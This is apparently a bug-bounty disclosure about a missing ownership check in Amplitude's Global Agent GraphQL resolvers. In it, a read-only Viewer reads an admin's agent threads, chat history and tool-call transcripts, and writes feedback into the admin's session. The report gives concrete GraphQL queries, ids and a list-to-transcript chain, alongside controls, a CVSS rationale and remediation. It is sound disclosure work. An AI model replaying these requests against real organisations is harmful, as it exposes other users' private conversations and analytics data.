# Amplitude Global Agent — cross-user object reference: the read-only Viewer can read another user's agent threads, run transcripts and conversation state

**Severity:** CVSS 7.1 (High) — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N`
**Tenant:** org `464637` (`agentmail-602393`), app `862908` — our own tenant only. VIEWER `mohamed-9499-2+member@agentmail.to` (`orgRole 1`, `appRoles: null`); ORG_ADMIN `mohamed-9499-3@agentmail.to` (`orgRole 4`, `appRoles: null`).

## Summary

The Global Agent runtime lives on `POST https://app.amplitude.com/fed/graphql/org/<orgId>`. **Seven** of its resolvers verify that the object they are handed **exists**, but never that the caller **owns** it: `agentGetThread`, `agentListThreads`, `agentForkThread`, `agentSearchObjects`, `agentSubmitFeedback` (a write), `agentGetThreadRun` and `agentGetSession`. The authorization decision is therefore made on existence, not on ownership, and any authenticated member of the organization — including the read-only **Viewer** role — can address another user's agent objects directly by id. The differential is unambiguous, because the same resolver produces a *distinguishable* error for a non-existent id, so the server knows the difference between "missing" and "not yours" and simply does not check ownership. This is not "an object shared by design": the session-access model that *would* express sharing says the opposite — `agentListSessionUserAccess(<the admin's sessionId>)` returns **`{"accessEntries": []}`** for the Viewer, and the admin's session does not appear in the Viewer's own `agentListSessions`. Three of the seven resolvers return materially more than a thread header: `agentGetThreadRun` returns the Admin's completed run including every `TOOL_CALL` and `TOOL_RETURN` verbatim — the raw tool arguments, the chart definition the agent built, and the **project analytics the agent retrieved from the organization's data** — while `agentGetThread` returns `stateJson.chat_history` in full and `agentSearchObjects` returns the artifact payload itself. The defect is specific and directional: reads of other users' agent objects are unscoped; writes and the memory subsystem are not.

Decisive differential:

```
VIEWER  agentGetThread("ab964d6f-8463-44fe-ba3a-aa217a992f46")   -> 200
        {threadId, sessionId, userId:"mohamed-9499-3@agentmail.to", orgUrl:"agentmail-602393", appId:"862908"}
VIEWER  agentGetThread("00000000-0000-0000-0000-000000000000")   -> NOT_FOUND
        {"message":"Thread 00000000-0000-0000-0000-000000000000 not found","extensions":{"code":"NOT_FOUND"}}
```

The object is not public, the caller has no relationship to it, and the server distinguishes the two cases — it simply does not check ownership.

## Repro

**1. The ORG_ADMIN creates an agent session, a thread and a marked object.**

```graphql
mutation AgentCreateSession($orgId: ID!, $appId: ID!, $userId: String!, $name: String, $tags: [String!]) {
  agentCreateSession(appId: $appId, input: {orgId: $orgId, appId: $appId, userId: $userId, name: $name, tags: $tags}) { sessionId }
}
mutation AgentCreateThread($sessionId: ID!, $flow: String!) {
  agentCreateThread(sessionId: $sessionId, flow: $flow) { threadId }
}
mutation AgentSubmitFeedback($sessionId: String!, $threadId: String!, $feedbackType: AgentFeedbackType!, $feedbackText: String) {
  agentSubmitFeedback(sessionId: $sessionId, threadId: $threadId, feedbackType: $feedbackType, feedbackText: $feedbackText) { objectStoreId }
}
```
```
[ADMIN] AgentCreateSession  -> 200 {"data":{"agentCreateSession":{"sessionId":"32a80523-c8f5-4563-81d2-ffb1e19e6866"}}}
[ADMIN] AgentCreateThread   -> 200 {"data":{"agentCreateThread":{"threadId":"ab964d6f-8463-44fe-ba3a-aa217a992f46"}}}
[ADMIN] AgentSubmitFeedback -> 200 {"data":{"agentSubmitFeedback":{"objectStoreId":"542b0695-6c71-419c-a261-5393ac6a5500"}}}
```

All three documents take `$sessionId: **ID!**`, not `String!`. Sending `String!` returns `400 GRAPHQL_VALIDATION_FAILED {"message":"An error occurred"}` — which reads like a missing resolver but is only an argument-type mismatch. The shipped documents in `bundles/gs-app/use-send-message-direct-D4HCrmCl.js` are authoritative here.

**2. The VIEWER reads the ADMIN's thread.**

```
POST https://app.amplitude.com/fed/graphql/org/464637
Cookie: <VIEWER session>          x-csrf-token: 1
{"query":"query AgentThreadContext($threadId: ID!) { agentGetThread(threadId: $threadId) { threadId sessionId userId orgUrl appId } }",
 "variables":{"threadId":"ab964d6f-8463-44fe-ba3a-aa217a992f46"}}

HTTP/1.1 200 OK
{"data":{"agentGetThread":{
   "threadId":"ab964d6f-8463-44fe-ba3a-aa217a992f46",
   "sessionId":"32a80523-c8f5-4563-81d2-ffb1e19e6866",
   "userId":"mohamed-9499-3@agentmail.to",        <- the ORG_ADMIN's identity
   "orgUrl":"agentmail-602393",
   "appId":"862908"}}}
```

The thread's stored state is the **`stateJson`** field — the shipped document is `query AgentThreadContextWithState($threadId: ID!) { agentGetThread(threadId: $threadId) { threadId requestContextJson stateJson } }`, and it is `stateJson.chat_history` that is the conversation itself (measured: 10 turns, including `model_name` and the assistant's answer). `requestContextJson` is a **different** field: it is the thread's run index — measured on the same thread as `[{"thread_run_id":"22064991-…","status":"completed","updated_at":"2026-09-20T02:07:32Z",…}]`, and `"[]"` on a thread with no run.

**3. The negative control proves it is an ownership failure, not a public object.**

```
[VIEWER] agentGetThread(threadId: "00000000-0000-0000-0000-000000000000")
-> 200 {"errors":[{"message":"Thread 00000000-0000-0000-0000-000000000000 not found",
                   "extensions":{"code":"NOT_FOUND"}}]}
```

**4. The Viewer has no legitimate relationship to that session.**

```
[VIEWER] agentListSessionUserAccess(sessionId: "32a80523-c8f5-4563-81d2-ffb1e19e6866")
-> 200 {"data":{"agentListSessionUserAccess":{"accessEntries":[]}}}
```

**5. The other resolvers with the same missing ownership check.**

| Operation | Result for the VIEWER |
|---|---|
| `agentGetThreadRun(threadRunId, sessionId, threadId)` | `200` — the Admin's completed run, including every `TOOL_CALL` and `TOOL_RETURN` verbatim: raw tool arguments, the chart definition the agent built, and the project analytics the agent retrieved from the organization's data |
| `agentListThreads(<admin's sessionId>)` | `200` — returns the admin's threads and their `threadRuns{threadRunId}`, i.e. the two identifiers the run read needs (a clean two-step chain from list to full transcript) |
| `agentForkThread(<admin's threadId>)` | `{"crossUser":true, "copiedObjectCount":0}` |
| `agentSearchObjects(objectType:"artifact")` | `200` — the artifact payload itself: `{"objectType":"artifact","content":{…BlocksArtifact…},"metadata":{"thread_id":"<admin's thread>","thread_run_id":"<admin's run>"}}` — the metadata names the victim's thread and run |
| `agentSubmitFeedback` into the admin's session | `200 {"objectStoreId":"…"}` — a **cross-user write** |
| `agentGetSession(sessionId)` | `200` — the Admin's session object (`userId`, `threads[]`, tags). The cheapest reproduction of the whole class: **one request, no chained ids** |

All verified with a read-only Viewer (`orgRole 1`), all with `NOT_FOUND` controls on fabricated ids. The root cause is one shared pattern: **the agent-runtime resolvers check `exists(object)` where they should check `owns(caller, object)`.**

**Controls**

```
# non-existent ids — the control that makes the finding
agentGetThread(00000000-0000-0000-0000-000000000000)          -> NOT_FOUND (distinguishable from the cross-user 200)
agentGetThreadRun(fabricated id)                              -> NOT_FOUND
agentGetSession(fabricated id)                                -> NOT_FOUND
agentSearchObjects(fabricated id)                             -> NOT_FOUND

# writes ARE gated — which is why the read-side gap is an oversight, not a design
agentUpdateThread / agentUpdateObject / agentAddSessionUserAccess -> FORBIDDEN "Only the session owner…"
agentArchiveThread / agentUpdateObject / agentSubmitArtifactDataCallback
                                                              -> FORBIDDEN "Only the session owner…"
agentArchiveSession                                           -> FORBIDDEN "You do not have permission to manage this session"

# thread/session search is scoped
agentSearchThreads(userId: <other>)          -> FORBIDDEN
agentSearchThreads(visibility: all_visible|owned) -> own threads only
agentListSessions (tag / owned / all_listable / orgAudit:true)    -> [] for the Viewer

# agent MEMORY is correctly gated — the same surface probed where it IS enforced
# (Admin-owned memory present, totalCount: 1 for its owner)
agentListMemories / agentSearchMemories(userId=<other>)   -> []   (the userId arg cannot widen scope)
agentCreateMemory(userId=<other>)                         -> FORBIDDEN
                                                             "…create memories outside your own scope"
agentUpdateMemory / agentDeleteMemory on another's memory -> NOT_FOUND, victim row survived
CONTROL: a Viewer CAN create and read its own memory — the read path is not vacuous

# cross-tenant — the gap does not cross the org boundary
ids from org 465907 addressed in the 464637 context   -> NOT_FOUND
AgentCreateSession in 465907                          -> FORBIDDEN

# the RBAC lead was investigated and RULED OUT as the escalation vector
RbacBatchCheckPermissions (VIEWER) ->
  AGENT_ANALYTICS_VIEW                 -> allowed: true
  AGENT_ANALYTICS_MANAGE_INACTIVE_EVAL -> allowed: false
  AGENT_ANALYTICS_TRIGGER_EVAL_RUN     -> allowed: false
  AGENT_ANALYTICS_ACTIVATE_EVAL        -> allowed: false
  (plus AI_VIEW_GLOBAL_AGENT -> true, AI_CREATE_GLOBAL_AGENT -> true, VIEW_PROJECT_DETAILS -> true)
=> the server evaluates the three eval-write permissions and correctly denies the Viewer all three,
   while granting the read permission; the `agent-analytics-rbac-enforced` flag only swaps a coarse
   client-side fallback. The hole is in the agent-runtime resolvers, not the RBAC layer.
```

No LLM call and no outbound tool call was made by this report's probes. All probe sessions were archived (`success:true`) and `agentListSessions` verified empty for both roles.

## Impact

A read-only **Viewer** — Amplitude's lowest role, and the default role for invited collaborators and read-only stakeholders — can read **other users' agent threads**, including the conversation state (`chat_history`) of an **organization administrator's** agent sessions, and can retrieve the Admin's completed run transcript with every tool call and return verbatim. Agent conversations routinely contain the questions a user asked, the data they queried, and the answers returned — exactly the material an organization expects to be private per user. Because `agentGetThreadRun` returns the tool trace and the project analytics the agent pulled, the exposure rises from "another user's thread exists and here is its header" to **another user's tool-level activity and the organization's analytics data**. The same pattern yields a cross-user **write** (`agentSubmitFeedback` into another user's session) and access to the org-wide object store via `agentSearchObjects`, whose artifact payload names the victim's thread and run. The missing check is uniform across seven resolvers, so it is not a single endpoint oversight — it is one shared `exists(object)`-instead-of-`owns(caller, object)` pattern in the resolver family.

**Ceiling.**

* **No cross-tenant reach.** Ids from org `465907` addressed in the `464637` context return `NOT_FOUND`; `AgentCreateSession` in `465907` returns `FORBIDDEN`.
* **No write reach beyond the one measured.** Thread updates, object updates, session-access additions, archives and artifact callbacks are all `FORBIDDEN`; the only cross-user write demonstrated is `agentSubmitFeedback`.
* **The memory subsystem is not affected** — reads are caller-scoped and cross-user writes are `FORBIDDEN`.
* **The RBAC layer is not the defect** — `AGENT_ANALYTICS_VIEW` is correctly `allowed: true` for a Viewer and the three eval-write permissions are correctly denied.
* **No credential or secret was obtained** — `mcpListCatalogEntries.oauthConfig.clientSecret` returns an empty string.
* No LLM call and no outbound tool call was made by these probes.

**CVSS terms and the measured fact behind each:**

| Term | Value | Support |
|---|---|---|
| `AV:N` | Network | reached over HTTPS on `app.amplitude.com` |
| `AC:L` | Low | one authenticated GraphQL request per object; ids are returned by the same family (`agentListThreads`, `agentGetSession`) |
| `PR:L` | Low | requires an authenticated session holding `orgRole 1` on the org |
| `UI:N` | None | the victim need not act |
| `S:U` | Unchanged | the gap does not cross the org boundary (`NOT_FOUND` for foreign ids, `FORBIDDEN` for foreign session creation) |
| `C:H` | High | measured: `agentGetThread` -> `200` with `userId: "mohamed-9499-3@agentmail.to"`; `agentGetThread` -> `stateJson.chat_history` in full; `agentGetThreadRun` -> every `TOOL_CALL`/`TOOL_RETURN` and the project analytics; `agentSearchObjects(objectType:"artifact")` -> the payload with `metadata.thread_id`/`thread_run_id` |
| `I:L` | Low | measured: `agentSubmitFeedback` into the admin's session -> `200 {"objectStoreId":"…"}` — a cross-user write, but it creates an object owned by the victim rather than altering the victim's objects |
| `A:N` | None | no availability loss measured |

**Independence from the other two Amplitude authorization reports.** This is a different asset and a different authorization mechanism from both. `SUBMISSION-GS-AUTHZ.md` is a Django REST permission class on the Guides & Surveys / Houston viewsets (`/a/`, `/h/`), evaluated against the org role. `SUBMISSION-TAXONOMY-SHIM.md` is a role check that is never evaluated on `/o/taxonomy-api-shim/*`, on a route whose own `readOnly` flag is wrong. This report is about the **federation GraphQL agent runtime** (`POST /fed/graphql/org/<orgId>`), where the resolvers verify that an object **exists** and never that the caller **owns** it. Different routes, different objects (agent sessions, threads, runs, stored objects), different fix (an ownership predicate in the resolver family, derived from one shared helper). The only thing shared with the GS-AUTHZ report is the *actor* — the read-only Viewer role — and that is the engagement's common thread, not a shared defect. Neither report's route, object or remediation appears in the other. (`SUBMISSION-XLIFF-DOS.md` is a different asset and class: parser resource consumption on an upload route.)

## Remediation

* Enforce ownership (or an explicit share grant) in the agent-runtime resolvers, not existence: resolve the caller from the session and require `thread.userId == caller` — or a row in the session-access table — before returning any thread, run or object.
* Apply the same predicate to **all seven**: `agentGetThread`, `agentListThreads`, `agentForkThread`, `agentSearchObjects`, `agentGetThreadRun`, `agentGetSession` and `agentSubmitFeedback`; derive it from one shared helper rather than repeating it per resolver.
* Treat `agentSearchObjects` as an org-scoped query that must itself be permission-gated (`AGENT_ANALYTICS_VIEW` plus an ownership filter), since it returns other users' objects.
* Return the same `NOT_FOUND` for "exists but not yours" as for "does not exist", so the API does not act as an existence oracle.
* **Regression test:** for each of the seven resolvers, address another user's object id with a Viewer session and assert `NOT_FOUND`; assert the owner still receives `200`; assert a fabricated id returns the identical `NOT_FOUND` (so the test cannot pass by a blanket denial). Use `$sessionId: ID!` in the documents, since a `String!` argument yields `GRAPHQL_VALIDATION_FAILED` and would make a broken test look like a fixed API.

**Shared root cause:** the seven resolvers are one family and the predicate is one helper — this is **one fix, not seven**. It is unrelated to the role-based permission classes behind `SUBMISSION-GS-AUTHZ.md` and to the missing role predicate behind `SUBMISSION-TAXONOMY-SHIM.md`, so no single change closes more than one of the three.

**Residual test data, declared:** `agentSearchObjects` has **no delete operation** — feedback and artifact objects cannot be removed, only overwritten. As of the final read-back this org's object store returns **8 rows**: 6 from earlier runs plus the 2 this report's chain created. Their `content` has been overwritten with `{"hermes_probe":"removed"}` / a non-sensitive marker and read back, and the only live content they ever carried was our own marker text. A triager running `agentSearchObjects(limit: 200)` will see these rows and should expect them.

---
Evidence: escal/root_verify_agent_20260919T*.json, escal/REPORT-AGENT-SURFACE.md, AGENTSURF/repro.json, AGENTSURF/ops.json, AGENTSURF/p1…p13 probes and raw JSON evidence, bundles/gs-app/use-send-message-direct-D4HCrmCl.js
